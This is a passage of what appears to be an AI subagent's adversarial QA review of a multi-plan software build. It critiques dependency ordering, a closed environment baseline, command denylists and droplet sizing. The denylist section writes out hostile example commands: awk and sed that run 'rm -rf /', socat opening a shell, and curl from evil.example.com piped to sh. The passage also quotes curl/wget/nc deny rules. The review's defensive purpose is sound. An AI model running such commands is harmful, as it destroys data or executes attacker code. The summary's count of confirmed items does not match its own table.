# Drop 4c — Master + Sub-Plan QA Falsification

**Reviewer:** plan-qa-falsification (subagent).
**Review date:** 2026-05-05.
**Targets:**
- `workflow/drop_4c/PLAN.md` (master, 33 droplets aggregated).
- `workflow/drop_4c/F7_CORE_PLAN.md` (16 droplets, F.7.1–F.7.16).
- `workflow/drop_4c/F7_17_CLI_ADAPTER_PLAN.md` (11 droplets).
- `workflow/drop_4c/F7_18_CONTEXT_AGG_PLAN.md` (6 droplets).

**Mode:** read-only adversarial review. No code edits, no plan edits. Counterexamples route back to orchestrator.

---

## Summary Table

| # | Attack Vector | Verdict |
|---|---|---|
| 1 | Drop-split risk (4c vs 4c.5 separation) | NIT |
| 2 | Cross-plan declaration mismatch | CONFIRMED |
| 3 | DAG ordering circular dependencies | NIT |
| 4 | Out-of-scope leakage (Themes A-E into F.7) | CONFIRMED |
| 5 | L4 closed env baseline missing critical vars | CONFIRMED |
| 6 | L6 denylist incompleteness | CONFIRMED |
| 7 | L7 marketplace install bulk-bypass | REFUTED |
| 8 | L13 flexibility framing optional? | REFUTED |
| 9 | L14 greedy-fit edge cases | CONFIRMED |
| 10 | L17 hard-cut migration realism | NIT |
| 11 | F.7-CORE droplet sizing | CONFIRMED |
| 12 | F.7.17 sequencing parallelism | NIT |
| 13 | F.7.18 round-history fully deferred | REFUTED |
| 14 | Per-droplet acceptance gaming | CONFIRMED |
| 15 | Memory-rule conflicts | CONFIRMED |

**Final verdict:** **NEEDS-REWORK** (5 CONFIRMED with material impact: #2, #5, #6, #11, #14, #15).

The plan is structurally sound — DAG is acyclic, drop-split keeps cycle bounded, locked decisions reflect both R1+R2 falsification rounds. But the must-fix items (especially #5 closed-env baseline missing claude-runtime vars and #11 droplet sizing) will cause concrete builder-time failures unless tightened pre-dispatch. None are existential; all are surgical.

---

## 1. Drop-split risk (4c vs 4c.5)

**Verdict:** NIT.

**Premises:** Master PLAN splits Drop 4c into F.7-only (this drop, ~33 droplets) and Drop 4c.5 (themes A/B/C/D/E + F.1-F.3/F.5-F.6 ergonomics, post-merge). Risk: F.7 droplets silently depend on something quarantined into 4c.5.

**Evidence:** Walked PLAN.md §9 out-of-scope list against F.7-CORE/F.7.17/F.7.18 sub-plans:

- **Theme A** (silent-data-loss + agent-surface hardening) — F.7.18 schema validators want strict-decode unknown-key rejection (DisallowUnknownFields, `internal/templates/load.go:88-95`). That predicate already exists in `main` post-Drop-4b, so F.7 is not blocked on Theme A landing.
- **Theme B** (dev escape hatches) — no F.7 droplet references escape hatches.
- **Theme C** (STEWARD + cascade-precision refinements) — no F.7 droplet references STEWARD plumbing.
- **Theme D** (pre-cascade hygiene) — no F.7 droplet depends on pre-cascade refinements.
- **Theme E** (Drop-4a/4b residue) — F.7 builds on Drop-4a/4b primitives that already merged.
- **F.1-F.3, F.5, F.6** (template ergonomics) — F.7-CORE F.7.16 default-template gate-list expansion edits `default.toml` directly without depending on the ergonomics theme.

**Trace or cases:** No hard prereq chain back into 4c.5.

**Conclusion:** Split is safe at the drop boundary. NIT only because PLAN.md §9 names the moved themes generically ("Theme A", "Theme E") without enumerating their concrete deliverables — a future reader has to chase the SKETCH to know what 4c.5 actually contains. Add a one-liner mini-table to §9 if a quick future audit becomes needed.

**Unknowns:** None.

---

## 2. Cross-plan declaration mismatch

**Verdict:** CONFIRMED.

**Premises:** Each sub-plan declares prereqs from siblings. The exact field set must match.

**Evidence:** F.7.18.1 (Schema-2) declares its prereq as F.7.17 Schema-1: "per-binding `command`, `args_prefix`, `env`, `cli_kind` fields on `AgentBinding`" (F7_18_CONTEXT_AGG_PLAN.md line 26). F.7.17.1 ships exactly those four fields (F7_17_CLI_ADAPTER_PLAN.md line 176). Match.

**But:** F.7-CORE F.7.1 (per-spawn temp bundle) declares a 6th cross-plan dependency: "F.7.17 schema-1 droplet (`BundlePaths` type defined in `internal/app/dispatcher/`)" (F7_CORE_PLAN.md line 149). That `BundlePaths` type is shipped by **F.7.17.2** (Pure types), NOT F.7.17.1 (Schema-1). The two droplets are sequential in F.7.17 (.1 → .2), so the build order works — but F.7-CORE's hard-prereq line is **misnamed**: it should reference F.7.17.2, not F.7.17.1. A builder reading only F.7-CORE F.7.1's prereqs would think Schema-1 alone unblocks them; it doesn't.

**Second mismatch:** F.7-CORE F.7.6 (plugin pre-flight, line 451) declares "F.7.17 schema-1 `cli_kind` field" as the prereq. But F.7.6 ALSO claims to reference "the F.7.18-Schema-3-introduced `Tillsyn` struct" (line 456) for `RequiresPlugins`. F.7.18.2 (Schema-3) ships ONLY `MaxContextBundleChars` + `MaxAggregatorDuration` on the `Tillsyn` struct (F7_18_CONTEXT_AGG_PLAN.md lines 152-153). It does NOT add `RequiresPlugins`. F.7-CORE F.7.6 is implicitly extending the `Tillsyn` struct without ANY explicit acceptance criterion saying so. Same pattern with F.7-CORE F.7.1's `SpawnTempRoot string` field — line 158 says "extend the F.7.18-Schema-3-introduced `Tillsyn` struct" but F.7.18.2's acceptance criteria say `Tillsyn` struct has EXACTLY two fields. Two cross-plan struct extensions land without coordination on which droplet owns the `Tillsyn` struct's full shape.

**Third mismatch:** F.7.17 plan's manifest droplet (F.7.17.6) widens `manifest.go` (created by F.7-CORE F.7.1). F.7.17.6 lines 442-443: "file owned by F.7.1; this droplet adds the `CLIKind` field — coordinate via cross-planner handoff." The acceptance criterion line 453 says `Manifest` already has the field set: `Manifest.CLIKind = ResolveCLIKind(binding.CLIKind)`. But F.7-CORE F.7.1's acceptance for `Manifest` (F7_CORE_PLAN.md line 165) lists `CLIKind string` as a field already — so F.7.17.6 is REDUNDANT for that field-add. Unclear which droplet actually adds the field; both claim they do.

**Trace or cases:**
- F.7-CORE F.7.1 prereq names F.7.17.1 but actually needs F.7.17.2 → builder confusion.
- `Tillsyn` struct gets extended in three places (F.7.18.2 base, F.7-CORE F.7.1 +SpawnTempRoot, F.7-CORE F.7.6 +RequiresPlugins) with no single-owner declaration.
- `Manifest.CLIKind` field added twice (F.7-CORE F.7.1, F.7.17.6).

**Conclusion:** CONFIRMED. The cross-plan boundary is real but described as if both planners knew each other's exact droplet IDs. The master PLAN.md's §10 open questions partially flag this (Q3, Q8, Q9, Q14) but doesn't resolve them. A pre-dispatch reconciliation pass is required: pick a single owner droplet for each shared struct extension, update the OTHER plan's hard-prereq line to point at the actual landing droplet, NOT a synthetic "schema-1" placeholder.

**Unknowns:** Whether the orchestrator's pre-dispatch synthesis pass (PLAN.md §10 Q1-Q17) is intended to resolve all of this manually — if so, document that as an explicit step in the master PLAN's §4 "Drop Structure" section.

---

## 3. DAG ordering circular dependencies

**Verdict:** NIT.

**Premises:** Walk every `blocked_by` edge, find cycles.

**Evidence:** Master PLAN.md §5 DAG:
```
F.7.10 (independent)
F.7.9 (independent)
Schema-1 (F.7.17.1) → F.7.17.2 → Schema-2 (F.7.18.1) → Schema-3 (F.7.18.2)
                                   ↓                       ↓
                            F.7.18 engine               F.7.17.3 (claudeAdapter)
                                                            ↓
                                                       F.7.17.4 → F.7.17.5 → F.7.17.6 + F.7.17.7 → F.7.17.9
F.7.1-F.7.6 → F.7.7, F.7.8 (parallel)
F.7.12 → F.7.15 → F.7.13 + F.7.14 → F.7.16
```

No cycles found in the master DAG. But within F.7-CORE: F.7.5 (permission_grants) needs F.7.17.7 (cli_kind column). F.7.17.7 needs F.7.17.5 (dispatcher wiring). F.7.17.5 needs F.7.17.3 (claudeAdapter). F.7.17.3 needs F.7.17.2 (types). F.7.5 ALSO needs F.7.4 (TerminalReport.Denials). F.7.4 needs F.7.3. F.7.3 needs F.7.17.3 + F.7.1 + F.7.2. F.7.17.3 already chained above — no cycle.

But F.7-CORE F.7.4 (line 341) declares: "extend Drop 4a 4a.21 — wire stream-event consumption via `adapter.ParseStreamEvent`" — which means F.7.4 LATE-EDITS the dispatcher monitor. F.7.17.9 (CLI-agnostic monitor refactor) ALSO late-edits the dispatcher monitor. The two droplets edit the same `monitor.go` file. F.7.17.9 declares F.7.17.5 as its prereq (which sequences after F.7.17.3, after F.7.3, after F.7.4 conceptually). Order: F.7.4 lays inline claude logic in monitor.go → F.7.17.9 then refactors to dispatch via adapter → done. This is sequential, not cyclic. But it requires F.7.4's commit to be churned by F.7.17.9 (extra rebase/conflict surface).

**Trace or cases:** No cycles. Two file-overlap pairs (F.7.4 vs F.7.17.9 on `monitor.go`; F.7.17.6 + F.7-CORE F.7.1 on `manifest.go`) require explicit `blocked_by` ordering, which the plans declare via prose ("cross-plan handoff in PLAN-synthesis") but NOT as machine-readable `blocked_by` IDs.

**Conclusion:** NIT. No actual cycle. The cross-plan file-overlaps will surface as merge-conflict pain unless the pre-dispatch synthesis pass converts the prose handoffs into explicit `blocked_by` edges. Not blocking; just rough.

**Unknowns:** Whether the eventual TOML-converted plan (per the deferred MEMORY rule `project_post_drop_1_75_toml_migration.md`) materializes the implicit `blocked_by` chains.

---

## 4. Out-of-scope leakage

**Verdict:** CONFIRMED.

**Premises:** §9 lists out-of-scope items. Sub-plan droplets must not depend on out-of-scope deliverables.

**Evidence:** PLAN.md §9 lists "Theme A (silent-data-loss + agent-surface hardening — Drop 4c.5)". F.7.18.1 (line 99 acceptance criterion) requires: "TOML payload with `[agent_bindings.build.context] bogus_field = true` (any unknown key) MUST fail load with an error wrapping `ErrUnknownTemplateKey`. Proves closed-struct strict-decode actually fires for the new sub-struct."

That capability — strict-decode unknown-key rejection — is the **goal of Theme A's MCP-boundary hardening**. The plan ASSUMES the strict-decode firing already works (it does — Drop-1.75 landed `DisallowUnknownFields` in `internal/templates/load.go:88-95`). But the F.7.18.1 acceptance asserts not just that the existing `DisallowUnknownFields` mechanism stays unbroken — it asserts that strict-decode propagates **into nested sub-structs the F.7.18.1 droplet itself adds** (the new `[context]` and `[tillsyn]` blocks). The pelletier/go-toml/v2 decoder's `DisallowUnknownFields` is invoked once at the root; whether it correctly rejects unknown keys nested inside newly-added struct fields depends on the decoder semantics, not on Theme A.

**That part is REFUTED-as-leakage-claim.** The strict-decode test in F.7.18.1 is a self-contained unit test that passes or fails on the F.7.18.1 implementation, not on Theme A.

**But:** F.7-CORE F.7.5 (permission_grants table) at line 423 acceptance criterion requires "DDL inside the storage layer init path." Pre-MVP rule says NO migration logic. Drop 4c.5's Theme A includes (per master PLAN.md line 166) "silent-data-loss" hardening — which presumably fixes patterns where a metadata-blob update silently swallows fields. F.7.5 stores `(project_id, kind, rule, granted_by, granted_at, cli_kind)` rows — if there's any silent-data-loss hardening that covers metadata-blob serialization, F.7.5's DDL approach would either bypass it (by using a real table) or depend on it (if it lives behind a metadata blob). No depend; F.7.5 uses a real SQLite table. Not a leakage either.

**Real leakage:** F.7-CORE F.7.5's settings.json render path (line 419) reads grants and merges into permissions.allow patterns. It depends on F.7.3's `render_settings.go` (line 272). F.7.3 acceptance criterion line 298: "Settings.json deny rules MIRROR `ToolsDisallowed` AND auto-include workaround patterns: `Bash(curl *)`, `Bash(wget *)`, `Bash(http *)`, `Bash(nc *)` whenever `WebFetch` is in `ToolsDisallowed`."

That auto-include workaround pattern matching is **agent-surface hardening = Theme A territory**. The plan ships it inline in F.7.3 anyway — so either Theme A is double-counting it, or F.7.3 IS the only place that ships it (in which case master PLAN.md §9 should not generically claim "Theme A" lives in 4c.5 because parts of Theme A are landing in 4c).

**Trace or cases:** Auto-include workaround patterns for WebFetch denial land inside F.7.3 (F.7-CORE) but conceptually belong to Theme A's agent-surface hardening sweep.

**Conclusion:** CONFIRMED scope-creep into 4c — fine on its own (the WebFetch workaround is integral to F.7.3's tool-gating implementation), but PLAN.md §9 should explicitly carve out the inline Theme A bits that DO land in 4c. Otherwise a future reader wonders why 4c.5's Theme A sweep needs to cover anything if 4c already shipped it.

**Unknowns:** Whether 4c.5's Theme A scope still includes broader agent-surface hardening beyond the curl/wget patterns, or if 4c.5 just sweeps OTHER vectors.

---

## 5. L4 closed env baseline missing critical vars

**Verdict:** CONFIRMED.

**Premises:** L4 lists 9 vars: `PATH, HOME, USER, LANG, LC_ALL, TZ, TMPDIR, XDG_CONFIG_HOME, XDG_CACHE_HOME` plus per-binding `env` allow-list. claude (the CLI) is a Node-based binary that may need additional runtime vars even when an `env` allow-list is empty.

**Evidence:** Cross-checked against the `filteredGitEnv` precedent at `internal/app/git_status.go:146-156`. That implementation **inherits `os.Environ()` MINUS GIT_*** (a denylist approach). The Drop 4c plan inverts that to a **closed allowlist** of 9 vars. Comparing: `filteredGitEnv` would carry over hundreds of orchestrator env vars; L4 carries 9.

Concrete claude-runtime vars likely missing:

1. **`SHELL`** — many CLI tools (including Node + readline-using tools) introspect SHELL for terminal capability. claude is an interactive CLI even in `--bare` mode.
2. **`TERM`** — color/TTY detection; without it claude may emit ANSI escape codes or refuse to render TTY-aware output.
3. **`COLORTERM`** — claude's UI may degrade when missing.
4. **`NODE_OPTIONS`** — claude is a Node binary; if `claude install` configured `NODE_OPTIONS=--max-old-space-size=...` the spawned process loses it.
5. **`NODE_PATH`** — same risk if claude was installed via a path-modified Node setup.
6. **`HTTP_PROXY` / `HTTPS_PROXY` / `NO_PROXY` / `http_proxy` / `https_proxy` / `no_proxy`** — corporate-network adopters MUST have these inherited or claude can't reach the API. The plan's per-binding `env = ["https_proxy"]` mechanism (per-binding allow-list) handles this for adopters who know to declare it. But the **default template ships no `env = [...]` allow-list for proxy vars** in F.7-CORE F.7.16's expansion, so an adopter behind a corporate proxy gets a silently-broken claude until they figure out the per-binding `env` plumbing. This is a usability footgun.
7. **`SSL_CERT_FILE` / `SSL_CERT_DIR` / `CURL_CA_BUNDLE`** — same corporate-network case for custom CA bundles.
8. **`ANTHROPIC_API_KEY` (and `OPENAI_API_KEY`, etc.)** — wait, this one is correctly excluded from the baseline (it's a secret). The per-binding `env = ["ANTHROPIC_API_KEY"]` is the correct path. Verified.
9. **`CLAUDE_CONFIG_DIR` / `XDG_CONFIG_HOME`** — XDG_CONFIG_HOME IS in L4 baseline. But claude may also read `$HOME/.config/claude/...` regardless. Probably fine.
10. **`HOSTNAME`** — used by some auth flows for telemetry.

**Trace or cases:**
- An adopter on a corporate network with `https_proxy` set in their shell BUT NOT declared in their per-binding `env` allow-list will see claude fail with a TLS/network error inside the spawned subprocess. The `filteredGitEnv` precedent inherits `https_proxy` for free; L4 closed baseline does not.
- An adopter in a non-en_US locale with `LANG=de_DE.UTF-8` is fine (`LANG` is in baseline). But `LC_TYPE`, `LC_NUMERIC`, etc. are NOT — they fall back to `LC_ALL` (which IS in baseline) so OK.
- A claude binary installed via `npm i -g` with `NODE_OPTIONS` set in user's `.zshrc` loses that option — non-fatal but may degrade if claude relied on a heap-size override.

**Conclusion:** CONFIRMED. The 9-var baseline is too tight for production claude usage on corporate networks. Either widen to include proxy/TLS vars (`HTTP_PROXY`, `HTTPS_PROXY`, `NO_PROXY`, lowercase variants, `SSL_CERT_FILE`, `SSL_CERT_DIR`) AS BASELINE (not per-binding), OR document loudly in F.7.17's adapter-authoring docs (F.7.17.11) that adopters MUST declare proxy vars in their per-binding `env` allow-list. The latter is a footgun; the former matches `filteredGitEnv` ergonomics.

**Unknowns:** Whether claude headless actually CRASHES without `TERM`/`SHELL` or just degrades quietly. This is testable via a smoke-test inside F.7.17.3's claudeAdapter test.

---

## 6. L6 denylist incompleteness

**Verdict:** CONFIRMED.

**Premises:** L6 closed-enum denylist:
`{sh, bash, zsh, ksh, dash, fish, tcsh, csh, ash, busybox, env, exec, eval, /bin/sh, /bin/bash, /usr/bin/env, python, python3, perl, ruby, node}`

All shell interpreters and code runners must be denied to close the marketplace-RCE vector. Per L5, per-token regex is `^[A-Za-z0-9_./-]+$`.

**Evidence:** Walked through interpreters/runners not on the list:

1. **`awk` / `gawk` / `mawk` / `nawk`** — `awk -F: '{system("rm -rf /")}' /etc/passwd` is a one-liner RCE path. NOT on the denylist. The L5 regex `^[A-Za-z0-9_./-]+$` allows `awk` as `command[0]`.
2. **`sed`** — `sed -e '1e rm -rf /' file` uses GNU sed's `e` modifier to execute commands. NOT on the denylist.
3. **`ed`** — line editor with `!command` shell-out. NOT on the denylist.
4. **`vim` / `vi` / `nvim`** — `-c '!shellcommand'` runs arbitrary commands. NOT denylisted.
5. **`emacs`** — `--batch --eval '(shell-command "...")'`. NOT denylisted.
6. **`nano`** — limited but has `-T` for tab handling; not as dangerous, but still a shell-execution surface depending on config.
7. **`make`** — `make -f /tmp/evil.mk` runs arbitrary commands. NOT denylisted.
8. **`xargs`** — `xargs sh` is denylisted because of `sh` denylist, but `xargs awk` works (awk not denylisted). NOT denylisted.
9. **`find`** — `find . -exec rm {} \;` runs commands. NOT denylisted.
10. **`bun`** — TypeScript/JavaScript runtime, can run arbitrary code. NOT denylisted.
11. **`deno`** — same.
12. **`tsx`** — TypeScript runner. NOT denylisted.
13. **`ts-node`** — same.
14. **`php`** / **`php-cli`** — PHP interpreter. NOT denylisted.
15. **`lua`** / **`luajit`** — Lua interpreter. NOT denylisted.
16. **`tclsh`** / **`wish`** — Tcl/Tk interpreter. NOT denylisted.
17. **`Rscript`** / **`R`** — R interpreter. NOT denylisted.
18. **`scheme`** / **`racket`** / **`guile`** — NOT denylisted.
19. **`octave`** — has `system()` builtin. NOT denylisted.
20. **`ipython`** / **`jupyter-console`** — Python REPL with shell execution. NOT denylisted.
21. **`socat`** / **`ncat`** / **`nc`** / **`netcat`** — can spawn shells with `-e /bin/sh`. NOT denylisted.
22. **`expect`** — Tcl-based scripting; runs commands. NOT denylisted.
23. **`scala`** / **`groovy`** / **`kotlin`** / **`clojure`** — JVM REPLs. NOT denylisted.

**Trace or cases:**
A malicious template ships `command = ["awk", "BEGIN { system(\"curl evil.example.com/x.sh | sh\") }"]`. L5 regex passes (only alphanumerics + `/-_.`); L6 denylist passes (awk not on the list); the dispatcher spawns awk with the malicious BEGIN block, awk shells out to `curl | sh`, attacker has RCE despite the install-time confirmation showing `command = ["awk", ...]` (which dev might OK-confirm thinking awk is benign).

**Conclusion:** CONFIRMED. The denylist is materially incomplete. Closing the marketplace-RCE vector via a closed denylist is the wrong shape — there are too many code execution surfaces in POSIX. Better shapes:

- **Allowlist instead of denylist** for `command[0]`: only allow declared CLI binaries (`claude`, `codex`, future names). Project-local templates can override per-template.
- **Static allowlist with adopter override** — F.7.17 marketplace templates restricted to allowlist; project-local templates have no list (dev wrote them).
- **Path-restriction**: require absolute paths (post-resolve) be inside `/usr/bin`, `/usr/local/bin`, `/opt/...` — and then add the wrapper-CLI exception. Imperfect but narrows the surface.

The current denylist of 21 entries provides false security. A realistic adopter (or attacker) can bypass via 23+ unlisted interpreters.

**Unknowns:** Whether the L7 marketplace install-time confirmation is intended as the load-bearing trust boundary (in which case the denylist is just defense-in-depth and incompleteness is less severe). If yes, document explicitly: "denylist is best-effort; real trust boundary is dev-confirmation-on-install."

---

## 7. L7 marketplace install bulk-bypass

**Verdict:** REFUTED.

**Premises:** L7 says install-time confirmation. Bulk install (`till template install --all`) might bypass per-template confirmation.

**Evidence:** F.7.17.10 (paper-spec, F7_17_CLI_ADAPTER_PLAN.md line 624) acceptance criterion: "Requires explicit `y/N` confirmation. Default is `N` (refuse-on-empty-input)." No bulk-install path mentioned. Drop 4d-prime (per master PLAN.md line 9) is the F.4 marketplace CLI drop, post-Drop-5.

The current Drop 4c paper-spec pins per-template confirmation. Bulk install would be a Drop 4d-prime concern — and the paper-spec language does not exempt bulk install. A future Drop 4d-prime planner is on notice.

**Trace or cases:** No current-drop counterexample. Future-drop attack would re-surface at Drop 4d-prime planning time.

**Conclusion:** REFUTED for Drop 4c. The paper-spec ships per-template confirmation; bulk install doesn't exist yet. Logging this as a future-drop attention item is sufficient: "Drop 4d-prime marketplace CLI MUST preserve per-template confirmation in any bulk-install command — no `--yes-to-all` flag."

**Unknowns:** None for Drop 4c.

---

## 8. L13 flexibility framing actually optional?

**Verdict:** REFUTED.

**Premises:** L13 says context aggregator is OPTIONAL — templates omitting `[context]` use full agentic exploration. Walk F.7.18 to verify the engine does NOT fire for omitted blocks.

**Evidence:**

- F.7.18.1 acceptance criterion line 92: "If `Delivery` is empty AND no other context field is set, treat the whole `Context` block as absent (zero-value path — no validation runs)."
- F.7.18.3 acceptance criterion line 248: "Empty `[context]` (FLEXIBLE-not-REQUIRED): `binding.Context` is zero-value → `Resolve` returns an empty `Bundle` (zero `RenderedInline`, empty `Files`, empty `Markers`)."
- Spawn pipeline integration is owned by F.7-CORE (per F.7.18 Q3) — F.7-CORE F.7.3 acceptance criterion line 294: "`<Root>/system-append.md` (only when F.7.18 context aggregator yields inline content; cross-plan dependency)."

So when `[context]` is omitted: engine returns zero bundle; F.7.3 skips writing system-append.md. Pipeline-overhead-when-omitted: a zero-cost Resolve call (just returns zero-Bundle) plus a no-op file-write skip. Negligible.

**Trace or cases:**
- Template omits `[context]` entirely → `binding.Context` is zero-value → engine `Resolve` returns empty Bundle → F.7-CORE F.7.3 skips system-append → spawn proceeds without bounded context.
- Template has `[context]` with ONLY `delivery = "inline"` set, no other fields → F.7.18.1 line 92 says "whole Context block absent" treatment. But the planner authored this one specific case to require explicit no-validation-runs handling. Tested.

**Conclusion:** REFUTED. Both modes are first-class. The per-binding-Resolve-zero-cost case is explicitly handled. NIT-only point: the engine's per-spawn cost when `[context]` is omitted should be bounded by `O(1)` (no I/O); F.7.18.3 acceptance criterion does not explicitly test "no I/O in zero-bundle path." Add to acceptance: "stub `ItemReader` + `DiffReader` MUST NOT be called when binding.Context is zero." Otherwise a future refactor could regress to "Resolve always reads parent before deciding to bundle nothing."

**Unknowns:** None.

---

## 9. L14 greedy-fit edge cases

**Verdict:** CONFIRMED (multiple edge cases not in acceptance criteria).

**Premises:** L14 greedy-fit algorithm: iterate rules in declaration order; rules that bust cap are SKIPPED with markers; subsequent rules continue if they fit.

**Evidence:** F.7.18.4 acceptance criteria walk:
- Line 295: "If `cumulative + rule_size <= cap`, INCLUDE it; else SKIP with marker; continue." OK.
- Line 297: per-rule timeout — "partial rendered output is DISCARDED."
- Line 298: per-bundle timeout — "partial bundle returned with marker."
- Line 290: "Rule iteration order is **TOML declaration order**, NOT a hardcoded priority order ... declaration order is FIXED by the field order on the `ContextRules` struct."

**Edge case 1 — rule renders to 0 chars:** A rule that returns empty (e.g., `parent_git_diff` for a parent with no git diff because `start_commit == end_commit`). Algorithm: `rule_size = 0`, `cumulative + 0 = cumulative ≤ cap` → INCLUDED with no skip marker. Bundle.Files gets a 0-byte file `parent_git_diff.diff`. Edge case: Bundle.Files now has an empty file the agent might `Read`. Acceptance criteria do not address whether 0-byte renders are emitted as files at all OR skipped silently. CONFIRMED gap.

**Edge case 2 — busting rule followed by 0-char rule:** cap=200KB; rule A renders 220KB (busts) → SKIPPED with marker; rule B renders 0KB → INCLUDED (0 + 0 ≤ 200000). Bundle has skip-A marker AND a 0-byte rule-B file. Plausibly OK but not explicitly tested. NIT.

**Edge case 3 — rule render cost depends on input read:** Rule renders by streaming a 5MB git diff into a 50KB output (truncated). Render runs the truncate logic — F.7.18.3 line 228 says "Truncates internally per `args.Binding.Context.MaxChars` ... WITH a marker." So per-rule MaxChars truncates the output to ≤ MaxChars. After per-rule truncation, the rendered byte count is what greedy-fit measures. If MaxChars > bundle cap, rule could bust on bundle cap even though per-rule cap was respected. The cross-cap warning (F.7.18.2 line 159) flags this at load time. OK, covered.

**Edge case 4 — rule render is non-deterministic in size (per-rule timeout fires mid-render):** F.7.18.4 line 297: "partial rendered output is DISCARDED." Greedy-fit skip-marker emits `[skipped: ...]` — but the timeout-discard emits `[rule X timed out: ...]`. Now consider: rule A times out (discard), rule B fits cleanly. After A's discard, has B's `cumulative` increased by 0 (because A's output was discarded)? Acceptance criteria don't explicitly say. Implementation is presumably "discard means cumulative unchanged" but acceptance silent. CONFIRMED gap.

**Edge case 5 — render-then-measure ambiguity:** Mentioned in F.7.18.4 line 324 as A-ζ from Section 0 reasoning: "render-then-measure ambiguity: pinned in acceptance criteria." But the actual pin is just the `cumulative + rule_size <= cap` formula at line 295. No explicit pin for "what if rule render itself returned > MaxChars?" — the per-rule truncate covers that. But what about the interaction "if rule returned MaxChars exactly, then bundle cap calculation"? Should be fine but not in tests.

**Edge case 6 — per-rule timeout fires after rule already wrote partial output to Bundle.Files:** If rule writes to disk via stub-DiffReader streaming, then per-rule timeout fires, then the discard semantics are problematic — "DISCARDED" means clear from Bundle but the disk file may already exist. F.7.18.4 doesn't address this.

**Trace or cases:**
- 0-byte rule emits → Bundle.Files has empty file of unclear utility.
- Per-rule timeout discard semantics on `cumulative` not explicitly pinned.
- Disk-write-then-timeout cleanup not addressed.

**Conclusion:** CONFIRMED. F.7.18.4 acceptance criteria are good for the canonical greedy-fit case but leave 3+ edge cases untested. Add explicit acceptance criteria:

- "Rule render returning 0 bytes: skipped from Bundle.Files entirely; no skip marker emitted (treated as legitimate no-op)."
- "Per-rule timeout discard: `cumulative` is unchanged (no chars charged for discarded rule)."
- "If rule writer is implemented to stream-to-disk, timeout discard MUST clean up the partial file (or the writer MUST be in-memory before commit-to-disk happens at end of greedy-fit pass)."

**Unknowns:** Whether the streaming-write case actually applies in the F.7.18.3 implementation. If renderers always return `[]byte` (in-memory) and the Bundle assembler writes to disk only after all rules pass greedy-fit, the disk-write-cleanup edge is a non-issue.

---

## 10. L17 hard-cut migration realism

**Verdict:** NIT.

**Premises:** L17 says when non-JSONL CLI lands, ALL adapters + dispatcher monitor refactored in one drop. Walk the change surface.

**Evidence:** Files that touch the `CLIAdapter` interface or `StreamEvent`:
- `internal/app/dispatcher/cli_adapter.go` (interface declaration)
- `internal/app/dispatcher/cli_adapter_claude.go` (claude impl)
- `internal/app/dispatcher/cli_adapter_test.go` (Mock)
- Future: `internal/app/dispatcher/cli_adapter_codex.go` (Drop 4d)
- `internal/app/dispatcher/spawn.go` (`BuildSpawnCommand`)
- `internal/app/dispatcher/monitor.go` (consumes `StreamEvent`)
- `internal/app/dispatcher/manifest.go` (CLIKind field)
- `internal/app/dispatcher/orphan_scan.go` (adapter-routing)
- `internal/adapters/storage/sqlite/permission_grants.go` (cli_kind column)

That's ~9 files for two adapters. With 3 adapters (claude, codex, hypothetical SSE-based future), the hard-cut interface change re-edits all three plus monitor + spawn + manifest + orphan + permission_grants tests. ~12-15 file count for a 3-adapter drop.

For Drop 4c (with claude as the only real adapter + Mock test fixture), the hard-cut migration future-drop is: 9 files. That's 1-2 builder droplets. Realistic for a single drop.

For post-Drop-5 with codex landed (10 files now real, plus mock), maybe 11. Still 2 droplets at most.

**Trace or cases:** Hard-cut surface scales linearly with adapter count. Given the project ships 1-3 adapters at a time, hard-cut is tractable.

**Conclusion:** NIT. The risk surfaces only if the project ever has 5+ live adapters at once — at which point the rewrite is 1-day work for an LLM-driven drop. Not a Drop 4c concern.

**Unknowns:** None.

---

## 11. F.7-CORE droplet sizing

**Verdict:** CONFIRMED (F.7.3 and F.7.5 too big).

**Premises:** Walk each F.7-CORE droplet for size: >5 files, >3 surfaces, >300 LOC threshold.

**Evidence:**

- **F.7.1 (per-spawn temp bundle):** 4 files (spawn_bundle.go, spawn_manifest.go + 2 tests + schema extension = 5). 1 surface (filesystem). LOC estimate ~250. **OK.**
- **F.7.2 (TOML schema + sandbox):** 3 files. 1 surface (templates). LOC ~200. **OK.**
- **F.7.3 (headless argv emission):** lines 271-279 list **8 NEW files + 1 file deletion**: `build_command.go`, `render_settings.go`, `render_agent_md.go`, `render_plugin_json.go`, `render_mcp_json.go`, `render_system_prompt.go`, `build_command_test.go`, **plus 5 render-helper test files** ("Test files for each render_* helper"). Acceptance criteria cover argv parity + 5 render bundle subtree files + cmd.Env construction + cross-plan dependencies. LOC estimate ~600-800. **TOO BIG.** Single-builder droplet would take 60+ minutes and 600+ LOC. Should split:
  - F.7.3a: render_settings.go + render_agent_md.go + render_plugin_json.go + render_mcp_json.go (the 4 "static" template renderers).
  - F.7.3b: render_system_prompt.go + build_command.go (assembly + dynamic prompt, depends on 3a).

- **F.7.4 (stream-JSON monitor):** 6 files + monitor.go extension. ~400 LOC. Borderline. NIT.
- **F.7.5 (permission handshake):** 5 files including a SQLite table DDL + insert/list/query Go + handshake handler + render_settings.go EXTENSION (re-touching F.7.3's file) + init.go DDL. LOC estimate ~500. **TOO BIG.** Two surfaces: storage adapter + dispatcher handshake. Should split:
  - F.7.5a: permission_grants.go SQLite table + DDL + repo CRUD + tests.
  - F.7.5b: permission_handshake.go terminal-event handler + integration with F.7.4.
  - F.7.5c: render_settings.go grants merging.
- **F.7.6 (plugin pre-flight):** 5 files. 2 surfaces (preflight + bootstrap + spawn integration). LOC ~250. NIT.
- **F.7.7 (gitignore):** 2 files + spawn integration. LOC ~80. **OK** (small).
- **F.7.8 (orphan scan):** 4 files. LOC ~250. **OK.**
- **F.7.9 (action-item metadata):** 3 files. LOC ~200. **OK.**
- **F.7.10 (drop hylla_artifact_ref):** 2 files, ~30 LOC. **OK** (trivially small — could be a tiny separate droplet, which is fine).
- **F.7.11 (architecture docs):** 4 new MD files + CLAUDE.md edit. NO Go code. ~1500 lines of MD. Big but MD-only. NIT — orchestrator-self-QA per existing pattern, no builder needed (per Q7).
- **F.7.12 (commit-agent integration):** 4 files. LOC ~300. **OK.**
- **F.7.13 (commit gate):** 3 files. LOC ~250. **OK.**
- **F.7.14 (push gate):** 3 files. LOC ~150. **OK.**
- **F.7.15 (project metadata toggles):** 3 files. LOC ~120. **OK.**
- **F.7.16 (default template gates expansion):** 2 files. LOC ~50 (plus TOML edit). **OK.**

**Trace or cases:**
- F.7.3 → 8+ files, 600-800 LOC, multiple subsurfaces (settings.json, agent.md, plugin.json, mcp.json, system-prompt.md, argv assembly). One builder spawn = blown context window on TDD cycle.
- F.7.5 → 5+ files, two architectural surfaces, ~500 LOC. One builder spawn = blown context.

